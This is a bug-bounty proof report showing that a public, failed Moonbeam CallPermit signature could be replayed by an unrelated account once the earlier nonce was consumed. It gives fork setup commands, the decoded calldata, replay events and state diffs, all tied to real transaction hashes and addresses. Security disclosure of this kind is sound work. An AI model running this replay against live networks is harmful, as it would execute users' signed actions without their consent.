# Bounty-Grade Proof: CallPermit Public-Signature Replay

Дата проверки: 2026-05-12

## A. Replay Succeeded

**Verdict: replay succeeded on Moonbeam-native Chopsticks fork.**

The exact `dispatch(...)` calldata from the failed tx was replayed after nonce `7` was consumed, from an unrelated funded EVM account, before the failed permit deadline.

Original failed tx:

- Network: Moonbeam
- Tx: `0xd5e49fc3e721a70059348b1186f3d7cfa14f52e7ac6af1fefb12eece4e6f862f`
- Block: `15410765`
- Status: failed
- Original dispatcher: `0x937C492A77aE90DE971986d003fFbc5f8bb2232C`
- Signed `from`: `0x6A210A61dC8112C1344858d82B1dbDE850b957a1`
- Target `to`: `0x597B2084f1a74df59f3431AbE38dBeEc42dFd1c2`
- Signed nonce recovered from EIP-712: `8`
- Deadline: `1777385542`
- Original block timestamp: `1777381944`
- Exact calldata hash: `0xd260079b740cab524ca61134953226d24ca93ceae58c54e319806e3ec008cf08`

Nonce-7 success that opened the replay window:

- Tx: `0x277b88471c24df7cfdf04d0104c537353cb1aff12f928141ff1d9e64bde9c5e6`
- Block: `15410766`
- Timestamp: `1777381950`
- Same signed `from`
- Consumed nonce `7`

Replay on fork:

- Fork: Chopsticks Moonbeam native fork at block `15410766`
- Replay dispatcher: `0x387d113949a1a2D5Df01B869aa992e94Bd062035`
- Replay dispatcher is unrelated to both original dispatcher and signed `from`
- Replay timestamp: `1777381956`
- Replay was before deadline `1777385542`
- Signed Ethereum replay tx hash on fork: `0x809457ce6f65f78beb11604fd960308d2a207eeb80ef7a6311722c79f000092a`
- Result: `ethereum.Executed` with `exitReason = Succeed: Returned`
- Receipt status code: `1`

## B. Evidence

Raw proof artifacts:

- Script: `research/replay_d5_chopsticks_substrate.js`
- Full result JSON: `research/replay_d5_chopsticks_substrate_result.json`
- Chopsticks log: `research/chopsticks_local_15410766.out.log`

Run setup:

```powershell
npm install --save-dev @acala-network/chopsticks@1.4.0 sqlite3
.\node_modules\.bin\chopsticks.cmd --config=moonbeam --block 15410766 --port 8011 --build-block-mode Instant
node research\replay_d5_chopsticks_substrate.js > research\replay_d5_chopsticks_substrate_result.json
```

Note: on Windows/Node 24, Chopsticks CJS loader needed a local path fix in `node_modules/@acala-network/chopsticks/dist/cjs/plugins/index.js`: use `fileURLToPath(location)` instead of `location.pathname`.

Decoded original failed calldata:

```text
CallPermit.dispatch(
  from     = 0x6A210A61dC8112C1344858d82B1dbDE850b957a1,
  to       = 0x597B2084f1a74df59f3431AbE38dBeEc42dFd1c2,
  value    = 0,
  data     = 0x130dbfbb...,
  gaslimit = 4000000,
  deadline = 1777385542,
  v/r/s    = public calldata
)
```

Outer target call:

```text
0x130dbfbb = SubmitTransaction(address,bytes)
dst        = 0xa1A3Cc69c5E2fA553b521aCC3c5876cd375195e3
```

Nested action:

```text
0xa05f1f2c = AddJoinCode(address,uint256,uint256,uint256)
args:
  0x88e0B12bC374D9322f1F7E137a90888b10D5dF7a
  2092741941
  500
  200
```

Replay event:

```text
ethereum.Executed(
  from = 0x387d113949a1a2d5df01b869aa992e94bd062035,
  to   = 0x000000000000000000000000000000000000080a,
  transactionHash = 0x809457ce6f65f78beb11604fd960308d2a207eeb80ef7a6311722c79f000092a,
  exitReason = Succeed: Returned
)
```

Other fork events:

```text
balances.Upgraded
balances.Withdraw
balances.Deposit
system.NewAccount
balances.Endowed
balances.Deposit
ethereum.Executed
system.ExtrinsicSuccess
```

The `system.NewAccount` / `balances.Endowed` side effect created/funded the join-code account during `AddJoinCode(...)`.

## C. State Diff

Before replay, at fork state after block `15410766`:

```text
timestampMs = 1777381950000
CallPermit.nonces(0x6A210A61...957a1) = 8
replay account balance = 1000000000000000000000
replay account nonce = 0
target owner = 0x6A210A61dC8112C1344858d82B1dbDE850b957a1
target IsMember(signedFrom) = true
nested target owner = 0x597B2084f1a74df59f3431AbE38dBeEc42dFd1c2
join-code account balance = 0
join-code system providers = 0
```

After replay:

```text
timestampMs = 1777381956000
CallPermit.nonces(0x6A210A61...957a1) = 9
replay account balance = 999962851000000000000
replay account nonce = 1
target owner = 0x6A210A61dC8112C1344858d82B1dbDE850b957a1
target IsMember(signedFrom) = true
nested target owner = 0x597B2084f1a74df59f3431AbE38dBeEc42dFd1c2
join-code account balance = 27861750000000000
join-code system providers = 1
```

Key diffs:

```text
CallPermit nonce: 8 -> 9
Replay EVM nonce: 0 -> 1
Join-code account balance: 0 -> 27861750000000000
Join-code system providers: 0 -> 1
```

This proves:

- exact public failed calldata became valid after nonce `7` was consumed;
- CallPermit consumed nonce `8` only on replay success;
- the target action executed and caused real state mutation;
- the replay sender was not bound by the signature.

## D. Impact Statement

This proves **user-action replay**, not merely relayer griefing.

The failed public tx disclosed a valid user signature for nonce `8`. It failed only because nonce `8` was not yet current. Once nonce `7` was consumed in the next block, the already-public nonce-`8` permit became executable by any observer until its deadline.

The replayed action was permission-sensitive:

- `0x597B...d1c2` is a `DriveMember` proxy/contract where `SubmitTransaction(address,bytes)` is `onlyMember`.
- The signed user `0x6A210A61...957a1` was owner/member, so CallPermit executed the target with user authority.
- `SubmitTransaction` performed an arbitrary nested call to `0xa1A3...195e3`.
- The nested call was `AddJoinCode(...)`, which mutated application permission/join-code state by creating/funding a join-code account.

This is not direct token-drain proof, but it is concrete unauthorized user-action execution from public failed calldata. The replay dispatcher did not need a fresh user signature and was unrelated to the original dispatcher.

## E. Mediation-Ready Bullets

- Moonbeam CallPermit signed payload does not bind dispatcher/msg.sender/relayer.
- `dispatch(...)` is permissionless, so any address can submit public calldata.
- Failed tx `0xd5e49f...` publicly exposed valid `v/r/s` for signed `from = 0x6A210A61...957a1`, nonce `8`, deadline `1777385542`.
- At the failed tx block, nonce `8` was a future nonce because nonce `7` had not been consumed.
- In the next block, tx `0x277b88...` consumed nonce `7` while the nonce-`8` deadline was still active.
- On a Moonbeam-native Chopsticks fork at block `15410766`, an unrelated account `0x387d...2035` replayed the exact calldata from `0xd5e49f...`.
- Replay succeeded: `ethereum.Executed` emitted `Succeed: Returned`.
- CallPermit nonce changed from `8` to `9`.
- The nested target action executed: `SubmitTransaction -> AddJoinCode(...)`.
- State changed: join-code account balance `0 -> 27861750000000000`, providers `0 -> 1`.
- Therefore the issue is exploitable as user-action replay from public failed calldata, not only as relayer gas griefing.
